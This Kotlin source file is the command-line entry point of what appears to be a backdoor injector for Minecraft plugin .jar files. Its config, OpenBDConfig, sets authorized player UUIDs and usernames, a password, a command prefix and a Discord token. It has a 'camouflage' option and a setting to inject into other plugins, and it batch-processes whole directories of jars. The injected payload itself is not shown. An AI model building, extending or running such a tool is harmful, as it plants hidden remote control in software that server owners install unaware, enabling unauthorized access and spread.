package com.tmquan2508.inject

import com.google.gson.Gson
import com.google.gson.GsonBuilder
import com.tmquan2508.inject.cli.Logs
import com.tmquan2508.inject.cli.findArg
import com.tmquan2508.inject.cli.boolArg
import com.tmquan2508.inject.cli.HELP_MESSAGE
import com.tmquan2508.inject.injector.process
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.PrintStream
import java.nio.file.Files
import java.nio.file.Paths
import kotlin.system.exitProcess

fun runCli(args: Array<String>) {
    if (args.isEmpty()) {
        showHelpAndExit()
    }

    val command = args.first()
    val commandArgs = args.drop(1)

    when (command) {
        "--inject" -> runInjection(commandArgs)
        "--generate-config" -> runGenerateConfig(commandArgs)
        "--status" -> runShowStatus()
        "--help", "-h" -> showHelpAndExit()
        else -> {
            Logs.error("Unknown command: $command")
            println(HELP_MESSAGE)
            exitProcess(1)
        }
    }
}

fun runShowStatus() {
    Logs.info("CHECK STATUS")
}

fun runGenerateConfig(args: List<String>) {
    val outputPath = args.firstOrNull()
        ?: throw Exception("Please provide the output path for the configuration file.\nExample: --generate-config config.json")
    try {
        val defaultConfig = OpenBDConfig()
        val gson = GsonBuilder().setPrettyPrinting().create()
        val jsonString = gson.toJson(defaultConfig)
        val file = File(outputPath)
        file.writeText(jsonString, Charsets.UTF_8)
        Logs.info("Default configuration file created successfully at: $outputPath")
        exitProcess(0)
    } catch (e: Exception) {
        handleError(Exception("Could not write default configuration file: ${e.message}"), true)
    }
}


fun runInjection(args: List<String>) {
    val configPath = findArg("config", "c", args)
        ?: throw Exception("Please provide the path to the configuration file with the --config <path> flag.\nOr generate a default configuration file with the command: --generate-config <filename.json>")

    val config = loadConfig(configPath)

    val mode = findArg("mode", "m", args) ?: "multiple"
    if (mode !in listOf("multiple", "single")) throw Exception("Invalid mode: $mode.")
    val input = findArg("input", "i", args) ?: if (mode == "multiple") "in" else "in.jar"
    val output = findArg("output", "o", args) ?: if (mode == "multiple") "out" else "out.jar"
    val replace = boolArg("replace", "r", args)
    val traceErrors = boolArg("trace-errors", "tr", args)
    val camouflage = boolArg("camouflage", null, args)

    val inputFiles = if (mode == "multiple") {
        val inputDir = Paths.get(input)
        if (!Files.exists(inputDir)) throw Exception("Input directory does not exist: $input")
        if (!Files.isDirectory(inputDir)) throw Exception("Input path is not a directory: $input")
        inputDir.toFile().listFiles()?.filter { it.isFile && it.extension == "jar" }?.map { it.toPath() } ?: emptyList()
    } else {
        listOf(Paths.get(input))
    }

    if (inputFiles.isEmpty()) {
        Logs.warn("No .jar files found in the input directory.")
        return
    }

    val outputFiles = if (mode == "multiple") {
        val outputDir = Paths.get(output)
        if (!Files.exists(outputDir)) Files.createDirectories(outputDir)
        if (!Files.isDirectory(outputDir)) throw Exception("Output path is not a directory: $output")
        inputFiles.map { outputDir.resolve(it.fileName) }
    } else {
        listOf(Paths.get(output))
    }

    for (i in inputFiles.indices) {
        try {
            process(
                input = inputFiles[i],
                output = outputFiles[i],
                replace = replace,
                camouflage = camouflage,
                uuids = config.authorizedUuids.toTypedArray(),
                usernames = config.authorizedUsernames.toTypedArray(),
                password = config.password,
                prefix = config.commandPrefix,
                discordToken = config.discordToken,
                injectOther = config.injectIntoOtherPlugins,
                warnings = config.displayDebugMessages
            )
        } catch (e: Exception) {
            handleError(e, traceErrors)
        }
    }
}

fun handleError(e: Exception, traceErrors: Boolean) {
    if (Logs.task) Logs.finish()
    Logs.error("${e::class.qualifiedName}: ${e.message}")
    if (traceErrors) {
        val stackTrace = ByteArrayOutputStream().use { buff ->
            PrintStream(buff).use { ps -> e.printStackTrace(ps) }
            buff.toString()
        }
        stackTrace.lines().filter { it.isNotBlank() }.forEach { Logs.error(it) }
    }
    exitProcess(1)
}

fun main(args: Array<String>) {
    try {
        runCli(args)
    } catch (e: Exception) {
        handleError(e, true)
    }
}

fun showHelpAndExit() {
    println(HELP_MESSAGE)
    exitProcess(0)
}

fun loadConfig(path: String): OpenBDConfig {
    val configFile = File(path)
    if (!configFile.exists()) {
        throw Exception("Configuration file not found: $path")
    }
    val jsonContent = configFile.readText()
    return Gson().fromJson(jsonContent, OpenBDConfig::class.java)
}